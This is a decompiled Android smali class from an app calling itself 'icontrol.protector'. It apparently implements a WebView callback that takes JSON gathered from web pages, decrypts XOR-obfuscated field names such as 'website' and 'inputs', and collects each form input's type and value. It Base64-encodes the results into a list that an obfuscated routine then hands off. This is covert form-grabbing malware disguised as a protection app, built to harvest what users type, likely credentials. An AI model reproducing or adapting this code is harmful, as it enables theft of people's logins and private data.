.class Lcom/icontrol/protector/WebBrowser$b;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/webkit/ValueCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/WebBrowser;->a(Landroid/content/Context;Landroid/webkit/WebView;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/WebBrowser$b;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Ljava/lang/String;)V
    .locals 12

    .line 1
    const/4 v0, 0x4

    new-array v1, v0, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    const/4 v1, 0x2

    new-array v3, v1, [B

    fill-array-data v3, :array_2

    new-array v4, v2, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_1

    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v4, 0x1

    sub-int/2addr v3, v4

    invoke-virtual {p1, v4, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p1

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v3, v2, [B

    fill-array-data v3, :array_5

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v3, v4, [B

    const/16 v4, 0x7a

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    new-array v4, v2, [B

    fill-array-data v4, :array_6

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v1, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const/4 p1, 0x7

    new-array p1, p1, [B

    fill-array-data p1, :array_7

    new-array v3, v2, [B

    fill-array-data v3, :array_8

    invoke-static {p1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sget-object v3, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v6, 0xb

    new-array v6, v6, [B

    fill-array-data v6, :array_9

    new-array v7, v2, [B

    fill-array-data v7, :array_a

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const/4 v3, 0x6

    new-array v3, v3, [B

    fill-array-data v3, :array_b

    new-array v4, v2, [B

    fill-array-data v4, :array_c

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v1

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    move v4, v5

    :goto_0
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    move-result v6

    if-ge v4, v6, :cond_0

    invoke-virtual {v1, v4}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v3

    new-array v6, v0, [B

    fill-array-data v6, :array_d

    new-array v7, v2, [B

    fill-array-data v7, :array_e

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x5

    new-array v8, v7, [B

    fill-array-data v8, :array_f

    new-array v9, v2, [B

    fill-array-data v9, :array_10

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v3, v6, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-array v8, v7, [B

    fill-array-data v8, :array_11

    new-array v9, v2, [B

    fill-array-data v9, :array_12

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    new-array v9, v7, [B

    fill-array-data v9, :array_13

    new-array v10, v2, [B

    fill-array-data v10, :array_14

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v8, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    new-array v9, v0, [B

    fill-array-data v9, :array_15

    new-array v10, v2, [B

    fill-array-data v10, :array_16

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    new-array v7, v7, [B

    fill-array-data v7, :array_17

    new-array v10, v2, [B

    fill-array-data v10, :array_18

    invoke-static {v7, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v9, v7}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    sget-object v7, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    new-array v10, v2, [B

    fill-array-data v10, :array_19

    new-array v11, v2, [B

    fill-array-data v11, :array_1a

    invoke-static {v10, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    new-array v10, v2, [B

    fill-array-data v10, :array_1b

    new-array v11, v2, [B

    fill-array-data v11, :array_1c

    invoke-static {v10, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v10, 0x9

    new-array v10, v10, [B

    fill-array-data v10, :array_1d

    new-array v11, v2, [B

    fill-array-data v11, :array_1e

    invoke-static {v10, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    new-array v10, v2, [B

    fill-array-data v10, :array_1f

    new-array v11, v2, [B

    fill-array-data v11, :array_20

    invoke-static {v10, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v9, Lntidisestablish/neumonoul/floccinaucinih/ab;->h:Ljava/lang/String;

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lntidisestablish/neumonoul/floccinaucinih/ab;->h:Ljava/lang/String;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lntidisestablish/neumonoul/floccinaucinih/ab;->h:Ljava/lang/String;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    invoke-static {v3, v5}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v3

    sget-object v6, Lcom/icontrol/protector/WebBrowser;->h:Ljava/util/ArrayList;

    invoke-virtual {v6, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    sget-object v3, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    add-int/lit8 v4, v4, 0x1

    goto/16 :goto_0

    :catch_0
    move-exception p1

    goto :goto_1

    :cond_0
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_1

    iget-object p1, p0, Lcom/icontrol/protector/WebBrowser$b;->a:Landroid/content/Context;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->W:Ljava/lang/String;

    sget-object v1, Lcom/icontrol/protector/WebBrowser;->h:Ljava/util/ArrayList;

    invoke-static {p1, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->g(Landroid/content/Context;Ljava/lang/String;Ljava/util/ArrayList;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_1
    :goto_2
    return-void

    :array_0
    .array-data 1
        0x41t
        -0x24t
        0x79t
        -0x9t
    .end array-data

    :array_1
    .array-data 1
        0x2ft
        -0x57t
        0x15t
        -0x65t
        0x48t
        0x69t
        -0x5et
        0x54t
    .end array-data

    :array_2
    .array-data 1
        -0x78t
        -0x38t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x56t
        -0x16t
        -0x45t
        0x23t
        -0x5t
        -0x6ct
        0x1t
        -0x20t
    .end array-data

    :array_4
    .array-data 1
        -0x13t
        0x46t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x4ft
        0x64t
        -0x5ct
        0x1bt
        -0x18t
        -0x20t
        -0x69t
        0x59t
    .end array-data

    :array_6
    .array-data 1
        0x58t
        0x79t
        0x57t
        0x36t
        -0x7at
        -0x10t
        -0x38t
        0x5t
    .end array-data

    :array_7
    .array-data 1
        0x3at
        0x55t
        -0x9t
        0xft
        -0x2et
        -0x54t
        -0x38t
    .end array-data

    :array_8
    .array-data 1
        0x4dt
        0x30t
        -0x6bt
        0x7ct
        -0x45t
        -0x28t
        -0x53t
        0x7t
    .end array-data

    :array_9
    .array-data 1
        -0x5dt
        -0x7ct
        0x65t
        -0x52t
        -0x16t
        -0x22t
        -0x43t
        0x4dt
        -0x5bt
        -0x17t
        0x20t
    .end array-data

    :array_a
    .array-data 1
        -0x8t
        -0x2dt
        0x0t
        -0x34t
        -0x67t
        -0x49t
        -0x37t
        0x28t
    .end array-data

    :array_b
    .array-data 1
        -0x65t
        0x5t
        0x55t
        0x13t
        -0x47t
        0x32t
    .end array-data

    nop

    :array_c
    .array-data 1
        -0xet
        0x6bt
        0x25t
        0x66t
        -0x33t
        0x41t
        -0x9t
        0x7dt
    .end array-data

    :array_d
    .array-data 1
        0x51t
        0x38t
        -0x6et
        -0x3ct
    .end array-data

    :array_e
    .array-data 1
        0x25t
        0x41t
        -0x1et
        -0x5ft
        0x21t
        0x59t
        -0x5et
        0x2dt
    .end array-data

    :array_f
    .array-data 1
        -0x53t
        -0x1et
        0x2dt
        -0x75t
        -0xbt
    .end array-data

    nop

    :array_10
    .array-data 1
        -0x38t
        -0x71t
        0x5dt
        -0x1t
        -0x74t
        0x27t
        -0x27t
        -0x2ft
    .end array-data

    :array_11
    .array-data 1
        0xbt
        -0x34t
        0x75t
        0x7ft
        0x37t
    .end array-data

    nop

    :array_12
    .array-data 1
        0x7dt
        -0x53t
        0x19t
        0xat
        0x52t
        -0x56t
        0x24t
        0x77t
    .end array-data

    :array_13
    .array-data 1
        -0x77t
        -0x75t
        -0xat
        -0x51t
        -0x46t
    .end array-data

    nop

    :array_14
    .array-data 1
        -0x14t
        -0x1at
        -0x7at
        -0x25t
        -0x3dt
        -0x4ct
        0x16t
        0x3t
    .end array-data

    :array_15
    .array-data 1
        -0x12t
        -0x5t
        0x3et
        0x58t
    .end array-data

    :array_16
    .array-data 1
        -0x76t
        -0x66t
        0x4at
        0x3dt
        0x4t
        -0x19t
        0x5dt
        -0x6t
    .end array-data

    :array_17
    .array-data 1
        -0x3ct
        -0x49t
        0x7ft
        -0x4at
        0x5t
    .end array-data

    nop

    :array_18
    .array-data 1
        -0x5ft
        -0x26t
        0xft
        -0x3et
        0x7ct
        0x31t
        0x1t
        0x79t
    .end array-data

    :array_19
    .array-data 1
        0x60t
        -0x55t
        0x60t
        -0x59t
        -0x1dt
        0x7et
        0x5et
        0x2t
    .end array-data

    :array_1a
    .array-data 1
        0x3bt
        -0x39t
        0x9t
        -0x37t
        -0x78t
        0x23t
        0x64t
        0x22t
    .end array-data

    :array_1b
    .array-data 1
        -0x54t
        0x6ct
        -0x60t
        -0x66t
        -0x5ft
        0x39t
        -0x44t
        0x7t
    .end array-data

    :array_1c
    .array-data 1
        -0x9t
        0x38t
        -0x27t
        -0x16t
        -0x3ct
        0x64t
        -0x7at
        0x27t
    .end array-data

    :array_1d
    .array-data 1
        0x1et
        0x79t
        0x1ft
        -0x12t
        -0x3bt
        -0x7at
        0x18t
        0x67t
        0x65t
    .end array-data

    nop

    :array_1e
    .array-data 1
        0x45t
        0x2ft
        0x7et
        -0x7et
        -0x50t
        -0x1dt
        0x45t
        0x5dt
    .end array-data

    :array_1f
    .array-data 1
        -0x5t
        0x9t
        0x5dt
        0x48t
        -0x11t
        0x3ft
        0x3ft
        0x58t
    .end array-data

    :array_20
    .array-data 1
        -0x60t
        0x4dt
        0x3ct
        0x3ct
        -0x76t
        0x62t
        0x5t
        0x78t
    .end array-data
.end method

.method public bridge synthetic onReceiveValue(Ljava/lang/Object;)V
    .locals 0

    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/icontrol/protector/WebBrowser$b;->a(Ljava/lang/String;)V

    return-void
.end method
